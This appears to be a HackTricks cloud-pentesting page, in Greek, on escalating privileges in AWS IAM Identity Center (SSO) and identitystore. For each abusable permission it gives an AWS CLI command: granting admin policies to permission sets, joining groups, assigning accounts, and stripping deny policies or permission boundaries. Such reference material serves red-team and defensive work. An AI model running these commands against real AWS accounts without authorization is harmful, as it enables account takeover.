# AWS - SSO & identitystore Privesc

{{#include ../../../banners/hacktricks-training.md}}

## AWS Identity Center / AWS SSO

Για περισσότερες πληροφορίες σχετικά με το AWS Identity Center / AWS SSO, ελέγξτε:

{{#ref}}
../aws-services/aws-iam-enum.md
{{#endref}}

> [!WARNING]
> Σημειώστε ότι από **προεπιλογή**, μόνο **χρήστες** με δικαιώματα **από** τον **Λογαριασμό Διαχείρισης** θα μπορούν να έχουν πρόσβαση και **να ελέγχουν το IAM Identity Center**.\
> Χρήστες από άλλους λογαριασμούς μπορούν να το επιτρέψουν μόνο αν ο λογαριασμός είναι **Ανατεθειμένος Διαχειριστής.**\
> [Δείτε τα έγγραφα για περισσότερες πληροφορίες.](https://docs.aws.amazon.com/singlesignon/latest/userguide/delegated-admin.html)

### ~~Reset Password~~

Ένας εύκολος τρόπος για να κλιμακώσετε τα δικαιώματα σε περιπτώσεις όπως αυτή θα ήταν να έχετε μια άδεια που να επιτρέπει την επαναφορά των κωδικών πρόσβασης των χρηστών. Δυστυχώς, είναι μόνο δυνατό να στείλετε ένα email στον χρήστη για να επαναφέρει τον κωδικό του, οπότε θα χρειαστείτε πρόσβαση στο email του χρήστη.

### `identitystore:CreateGroupMembership`

Με αυτή την άδεια είναι δυνατό να τοποθετήσετε έναν χρήστη μέσα σε μια ομάδα ώστε να κληρονομήσει όλα τα δικαιώματα που έχει η ομάδα.
```bash
aws identitystore create-group-membership --identity-store-id <tore-id> --group-id <group-id> --member-id UserId=<user-id>
```
### `sso:PutInlinePolicyToPermissionSet`, `sso:ProvisionPermissionSet`

Ένας επιτιθέμενος με αυτή την άδεια θα μπορούσε να παραχωρήσει επιπλέον άδειες σε ένα Permission Set που έχει παραχωρηθεί σε έναν χρήστη υπό τον έλεγχό του.
```bash
# Set an inline policy with admin privileges
aws sso-admin put-inline-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --inline-policy file:///tmp/policy.yaml

# Content of /tmp/policy.yaml
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Statement1",
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:AttachManagedPolicyToPermissionSet`, `sso:ProvisionPermissionSet`

Ένας επιτιθέμενος με αυτή την άδεια θα μπορούσε να παραχωρήσει επιπλέον άδειες σε ένα Permission Set που έχει παραχωρηθεί σε έναν χρήστη υπό τον έλεγχό του.
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-managed-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --managed-policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:AttachCustomerManagedPolicyReferenceToPermissionSet`, `sso:ProvisionPermissionSet`

Ένας επιτιθέμενος με αυτή την άδεια θα μπορούσε να παραχωρήσει επιπλέον άδειες σε ένα Permission Set που έχει παραχωρηθεί σε έναν χρήστη υπό τον έλεγχό του.

> [!WARNING]
> Για να εκμεταλλευτείτε αυτές τις άδειες σε αυτή την περίπτωση, πρέπει να γνωρίζετε το **όνομα μιας πολιτικής διαχείρισης πελατών που βρίσκεται σε ΟΛΟΥΣ τους λογαριασμούς** που θα επηρεαστούν.
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-customer-managed-policy-reference-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --customer-managed-policy-reference <customer-managed-policy-name>

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:CreateAccountAssignment`

Ένας επιτιθέμενος με αυτή την άδεια θα μπορούσε να δώσει ένα Permission Set σε έναν χρήστη υπό τον έλεγχό του σε έναν λογαριασμό.
```bash
aws sso-admin create-account-assignment --instance-arn <instance-arn> --target-id <account_num> --target-type AWS_ACCOUNT --permission-set-arn <permission_set_arn> --principal-type USER --principal-id <principal_id>
```
### `sso:GetRoleCredentials`

Επιστρέφει τα βραχυπρόθεσμα διαπιστευτήρια STS για ένα συγκεκριμένο όνομα ρόλου που έχει ανατεθεί στον χρήστη.
```
aws sso get-role-credentials --role-name <value> --account-id <value> --access-token <value>
```
Ωστόσο, χρειάζεστε ένα access token που δεν είμαι σίγουρος πώς να αποκτήσετε (TODO).

### `sso:DetachManagedPolicyFromPermissionSet`

Ένας επιτιθέμενος με αυτή την άδεια μπορεί να αφαιρέσει τη σύνδεση μεταξύ μιας διαχειριζόμενης πολιτικής AWS από το συγκεκριμένο σύνολο αδειών. Είναι δυνατόν να παραχωρηθούν περισσότερες άδειες μέσω **αφαίρεσης μιας διαχειριζόμενης πολιτικής (πολιτική άρνησης)**.
```bash
aws sso-admin detach-managed-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN> --managed-policy-arn <ManagedPolicyARN>
```
### `sso:DetachCustomerManagedPolicyReferenceFromPermissionSet`

Ένας επιτιθέμενος με αυτή την άδεια μπορεί να αφαιρέσει τη σύνδεση μεταξύ μιας πολιτικής που διαχειρίζεται ο πελάτης από το συγκεκριμένο σύνολο αδειών. Είναι δυνατόν να παραχωρηθούν περισσότερα προνόμια μέσω της **αφαίρεσης μιας διαχειριζόμενης πολιτικής (πολιτική άρνησης)**.
```bash
aws sso-admin detach-customer-managed-policy-reference-from-permission-set --instance-arn <value> --permission-set-arn <value> --customer-managed-policy-reference <value>
```
### `sso:DeleteInlinePolicyFromPermissionSet`

Ένας επιτιθέμενος με αυτή την άδεια μπορεί να αφαιρέσει τις άδειες από μια inline policy από το permission set. Είναι δυνατόν να παραχωρηθούν **περισσότερες άδειες αποσυνδέοντας μια inline policy (deny policy)**.
```bash
aws sso-admin delete-inline-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN>
```
### `sso:DeletePermissionBoundaryFromPermissionSet`

Ένας επιτιθέμενος με αυτή την άδεια μπορεί να αφαιρέσει το Permission Boundary από το σύνολο αδειών. Είναι δυνατόν να παραχωρηθούν **περισσότερες άδειες αφαιρώντας τους περιορισμούς στο Permission Set** που δίνονται από το Permission Boundary.
```bash
aws sso-admin   delete-permissions-boundary-from-permission-set --instance-arn <value> --permission-set-arn <value>
```
{{#include ../../../banners/hacktricks-training.md}}
